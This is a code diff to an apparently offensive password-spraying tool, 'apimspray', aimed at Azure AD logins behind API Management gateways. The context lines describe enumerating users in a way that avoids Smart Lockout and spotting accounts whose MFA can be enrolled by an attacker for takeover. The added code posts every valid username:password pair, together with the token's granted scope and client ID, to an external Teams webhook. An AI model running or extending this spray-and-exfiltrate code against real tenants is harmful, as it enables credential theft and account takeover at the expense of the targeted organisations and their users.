@@ -58,6 +58,11 @@ USER_NOT_FOUND_ERROR = "AADSTS50034"
 # and take the account over. Distinct from 50076 (MFA already enrolled/enforced).
 MFA_ENROLL_ERROR = "AADSTS50079"
 
+# Teams webhook for valid-credential alerts. Resolved from (in order):
+# --webhook, $APIMSPRAY_WEBHOOK, then a webhook.txt file next to this script.
+WEBHOOK_ENV_VAR = "APIMSPRAY_WEBHOOK"
+WEBHOOK_FILE = "webhook.txt"
+
 # User enumeration via GetCredentialType (unauthenticated: no password sent,
 # so it never counts toward Smart Lockout). IfExistsResult meaning:
 #   0/5/6 -> account exists, 1 -> does not exist, other -> unknown.
@@ -257,6 +262,84 @@ class Logger:
     def write_manifest(self, data):
         with open(self.manifest_file, "w", encoding="utf-8") as f:
             json.dump(data, f, indent=2)
+
+def resolve_webhook(cli_value=None):
+    """
+    Resolves the Teams webhook URL. Precedence: --webhook, then the
+    APIMSPRAY_WEBHOOK env var, then a webhook.txt file next to this script (or in
+    the current directory). Returns None if none is configured.
+    """
+    if cli_value:
+        return cli_value.strip()
+    env_val = os.environ.get(WEBHOOK_ENV_VAR)
+    if env_val and env_val.strip():
+        return env_val.strip()
+    for candidate in (Path(__file__).resolve().parent / WEBHOOK_FILE, Path(WEBHOOK_FILE)):
+        if candidate.is_file():
+            lines = load_file_lines(candidate)
+            if lines:
+                return lines[0]
+    return None
+
+class Notifier:
+    """
+    Posts valid-credential alerts to a Microsoft Teams webhook (Power Automate
+    Workflows or legacy connector). Failures never interrupt the spray.
+    """
+    def __init__(self, webhook_url):
+        self.webhook_url = webhook_url
+
+    @property
+    def enabled(self):
+        return bool(self.webhook_url)
+
+    def notify_valid(self, target, classification, gateway_host, app_config=None, token_payload=None):
+        if not self.enabled:
+            return
+        mfa_enrollable = "MFA Enrollment Available" in classification
+        title = "MFA enrollment available — possible account takeover" if mfa_enrollable else "Valid credentials found"
+        facts = [
+            {"title": "Credentials", "value": f"`{target.username}:{target.password}`"},
+            {"title": "Result", "value": classification},
+        ]
+        # Prefer what the token actually granted; fall back to what we requested.
+        granted_scope = token_payload.get("scope") if isinstance(token_payload, dict) else None
+        granted_resource = token_payload.get("resource") if isinstance(token_payload, dict) else None
+        if app_config:
+            if app_config.get("client_id"):
+                facts.append({"title": "Client ID", "value": f"`{app_config['client_id']}`"})
+            resource = granted_resource or app_config.get("resource")
+            if resource:
+                facts.append({"title": "Resource", "value": resource})
+        if granted_scope:
+            facts.append({"title": "Granted Scope", "value": granted_scope})
+        elif app_config and app_config.get("scope"):
+            facts.append({"title": "Requested Scope", "value": app_config["scope"]})
+        facts += [
+            {"title": "Gateway", "value": gateway_host or "-"},
+            {"title": "Time", "value": utc_now_str()},
+        ]
+        card = {
+            "type": "AdaptiveCard",
+            "$schema": "http://adaptivecards.io/schemas/adaptive-card.json",
+            "version": "1.4",
+            "body": [
+                {"type": "TextBlock", "text": f"apimspray: {title}", "weight": "Bolder", "size": "Medium", "wrap": True},
+                {"type": "FactSet", "facts": [{"title": f["title"], "value": f["value"]} for f in facts]},
+            ],
+        }
+        payload = {
+            "type": "message",
+            # summary/text keep it readable on clients that ignore the card.
+            "text": f"apimspray: {title} — {target.username}:{target.password} ({classification})",
+            "attachments": [
+                {"contentType": "application/vnd.microsoft.card.adaptive", "content": card}
+            ],
+        }
+        try:
+            requests.post(self.webhook_url, json=payload, timeout=10)
+        except requests.RequestException as e:
+            print_warn(f"Webhook notification failed: {e}")
 
 # --- Helper Functions ---
 
@@ -622,6 +705,7 @@ def process_attempt(
     lock,
     continue_on_success,
     stop_event,
+    notifier=None,
 ):
     """
     Worker function to process a single login attempt.
@@ -742,8 +826,14 @@ def process_attempt(
 
     # Persist any token we actually obtained (ROPC success returns access_token).
     has_token = bool(status_code == 200 and has_access_token(response_text))
+    token_payload = None
     if has_token:
         logger.log_token(build_token_record(target, app_config, gateway_url, response_text))
+        try:
+            parsed = json.loads(response_text)
+            token_payload = parsed if isinstance(parsed, dict) else None
+        except json.JSONDecodeError:
+            token_payload = None
 
     record = build_attempt_record(target, aadsts, classification, app_config, gateway_url, status_code, has_token)
 
@@ -752,6 +842,8 @@ def process_attempt(
     if classification.startswith("VALID"):
         console_msg = format_result_line(timestamp, target, classification)
         valid_view = f"{target.username}:{target.password} | {classification}"
+        if notifier:
+            notifier.notify_valid(target, classification, urlparse(gateway_url).netloc, app_config, token_payload)
     elif classification.startswith("BLOCKED") or classification.startswith("LOCKED"):
         console_msg = format_result_line(timestamp, target, classification)
     elif classification.startswith("FAILED"):
@@ -867,7 +959,14 @@ def main():
         action="store_true",
         help="Automatically slow down the spray (increase delay) when Smart Lockouts are encountered.",
     )
-    
+    parser.add_argument(
+        "--webhook",
+        help=(
+            "Microsoft Teams webhook URL for valid-credential alerts. If omitted, "
+            f"falls back to the {WEBHOOK_ENV_VAR} env var, then a {WEBHOOK_FILE} file."
+        ),
+    )
+
     args = parser.parse_args()
 
     # Handle Missing/Empty URLs
@@ -947,6 +1046,11 @@ def main():
     # Setup Logging
     logger = Logger(args.output, args.mode)
     print_info(f"Run dir: {style(str(logger.run_dir), TermColors.CYAN, TermColors.BOLD)}")
+
+    # Teams webhook notifier (valid-credential alerts). Optional.
+    notifier = Notifier(resolve_webhook(args.webhook))
+    if notifier.enabled:
+        print_info("Teams webhook: " + style("enabled", TermColors.GREEN, TermColors.BOLD))
 
     # Pace Config
     pace_config = PACE_SETTINGS[args.pace].copy() # copy to allow mutation
@@ -1052,6 +1156,7 @@ def main():
                     lock,
                     args.continue_on_success,
                     stop_event,
+                    notifier,
                 )
                 futures.append(future)
                 
